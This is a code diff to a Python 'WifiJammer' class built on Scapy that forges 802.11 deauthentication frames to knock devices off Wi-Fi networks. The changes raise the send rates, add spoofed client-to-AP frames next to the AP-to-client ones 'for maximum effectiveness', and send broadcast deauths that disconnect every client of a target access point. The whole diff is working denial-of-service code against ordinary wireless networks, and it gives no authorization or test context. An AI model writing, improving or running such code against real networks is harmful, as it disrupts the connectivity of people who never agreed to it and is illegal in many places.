@@ -172,8 +172,8 @@ class WifiJammer:
         self._protected_macs: set = set()  # Protected MAC addresses (like robot's MAC)
 
         # Configuration
-        self._default_packet_rate = 100  # packets per second
-        self._max_packet_rate = 500
+        self._default_packet_rate = 200  # packets per second (increased for effectiveness)
+        self._max_packet_rate = 1000  # increased max rate
 
         # Scan results
         self._scan_results: List[NetworkInfo] = []
@@ -739,29 +739,47 @@ class WifiJammer:
             is_robot_network=False
         )
 
-    def _build_deauth_packet(self, target_bssid: str, client_mac: str = "ff:ff:ff:ff:ff:ff") -> bytes:
+    def _build_deauth_packet(self, target_bssid: str, client_mac: str = "ff:ff:ff:ff:ff:ff", from_ap: bool = True) -> bytes:
         """
         Build a deauthentication packet
 
         Args:
             target_bssid: Target access point MAC address
             client_mac: Target client MAC address (default: broadcast)
+            from_ap: If True, packet appears to come from AP; if False, from client
 
         Returns:
             Raw deauthentication packet bytes
         """
         try:
-            # Create deauthentication frame
-            # For client deauth: AP (addr2) sends to client (addr1) with BSSID (addr3)
-            # FCfield=2 sets the From-DS flag (frame from distribution system)
-            dot11 = Dot11(
-                type=0,                    # Management frame
-                subtype=12,                # Deauthentication
-                addr1=client_mac,          # Destination (client)
-                addr2=target_bssid,        # Source (AP)
-                addr3=target_bssid,        # BSSID (AP)
-                FCfield=2                  # From-DS flag (0x02)
-            )
+            if from_ap:
+                # Packet from AP to client (AP kicks client)
+                # addr1 = client (destination)
+                # addr2 = AP (source)
+                # addr3 = AP (BSSID)
+                # FCfield = 2 (From-DS)
+                dot11 = Dot11(
+                    type=0,                    # Management frame
+                    subtype=12,                # Deauthentication
+                    addr1=client_mac,          # Destination (client)
+                    addr2=target_bssid,        # Source (AP)
+                    addr3=target_bssid,        # BSSID (AP)
+                    FCfield=2                  # From-DS flag (0x02)
+                )
+            else:
+                # Packet from client to AP (client leaves network)
+                # addr1 = AP (destination)
+                # addr2 = client (source)
+                # addr3 = AP (BSSID)
+                # FCfield = 0 (To-DS or no DS)
+                dot11 = Dot11(
+                    type=0,                    # Management frame
+                    subtype=12,                # Deauthentication
+                    addr1=target_bssid,        # Destination (AP)
+                    addr2=client_mac,          # Source (client)
+                    addr3=target_bssid,        # BSSID (AP)
+                    FCfield=0                  # No DS flag (0x00)
+                )
 
             deauth = Dot11Deauth(reason=7)  # Reason 7: Class 3 frame received from nonassociated STA
 
@@ -774,23 +792,31 @@ class WifiJammer:
             logger.error(f"Error building deauth packet: {e}")
             # Fallback to simpler packet construction
             try:
-                dot11 = Dot11(
-                    type=0,
-                    subtype=12,
-                    addr1=client_mac,
-                    addr2=target_bssid,
-                    addr3=target_bssid
-                )
-                # Set From-DS flag manually
-                dot11.FCfield = 2
+                if from_ap:
+                    dot11 = Dot11(
+                        type=0,
+                        subtype=12,
+                        addr1=client_mac,
+                        addr2=target_bssid,
+                        addr3=target_bssid
+                    )
+                    dot11.FCfield = 2
+                else:
+                    dot11 = Dot11(
+                        type=0,
+                        subtype=12,
+                        addr1=target_bssid,
+                        addr2=client_mac,
+                        addr3=target_bssid
+                    )
+                    dot11.FCfield = 0
+
                 deauth = Dot11Deauth(reason=7)
                 packet = RadioTap() / dot11 / deauth
                 return packet
             except Exception as e2:
                 logger.error(f"Error building fallback deauth packet: {e2}")
                 raise
-
-        return packet
 
     def _jamming_loop(
         self,
@@ -833,7 +859,7 @@ class WifiJammer:
 
                 # Handle different attack modes
                 if mode == JammerMode.CLIENT and target_macs:
-                    # Client mode: target specific MAC addresses
+                    # Client mode: target specific MAC addresses with bidirectional deauth
                     for bssid in target_bssids:
                         if self._stop_event.is_set():
                             break
@@ -853,12 +879,19 @@ class WifiJammer:
                                 continue
 
                             try:
-                                # Send deauth to specific client
-                                packet = self._build_deauth_packet(bssid, mac)
-                                sendp(packet, iface=self.monitor_interface, verbose=0, count=1)
+                                # Send bidirectional deauth packets for maximum effectiveness
+                                # 1. AP -> Client (AP kicks client)
+                                packet_ap_to_client = self._build_deauth_packet(bssid, mac, from_ap=True)
+                                sendp(packet_ap_to_client, iface=self.monitor_interface, verbose=0, count=1)
+
+                                # 2. Client -> AP (Client leaves network)
+                                packet_client_to_ap = self._build_deauth_packet(bssid, mac, from_ap=False)
+                                sendp(packet_client_to_ap, iface=self.monitor_interface, verbose=0, count=1)
 
                                 with self._status_lock:
-                                    self._status.packets_sent += 1
+                                    self._status.packets_sent += 2  # Count both packets
+
+                                consecutive_send_errors = 0  # Reset error counter on success
 
                             except Exception as e:
                                 logger.error(f"Error sending deauth to {mac} on {bssid}: {e}")
@@ -872,7 +905,7 @@ class WifiJammer:
                                     break
 
                 else:
-                    # Mass or targeted mode: target BSSIDs
+                    # Mass or targeted mode: target BSSIDs with broadcast deauth
                     for bssid in target_bssids:
                         if self._stop_event.is_set():
                             break
@@ -883,11 +916,17 @@ class WifiJammer:
                             continue
 
                         try:
-                            packet = self._build_deauth_packet(bssid)
+                            # Send broadcast deauth to disconnect all clients
+                            # addr1 = broadcast (ff:ff:ff:ff:ff:ff)
+                            # addr2 = AP (source)
+                            # addr3 = AP (BSSID)
+                            packet = self._build_deauth_packet(bssid, "ff:ff:ff:ff:ff:ff", from_ap=True)
                             sendp(packet, iface=self.monitor_interface, verbose=0, count=1)
 
                             with self._status_lock:
                                 self._status.packets_sent += 1
+
+                            consecutive_send_errors = 0  # Reset error counter on success
 
                         except Exception as e:
                             logger.error(f"Error sending deauth to {bssid}: {e}")
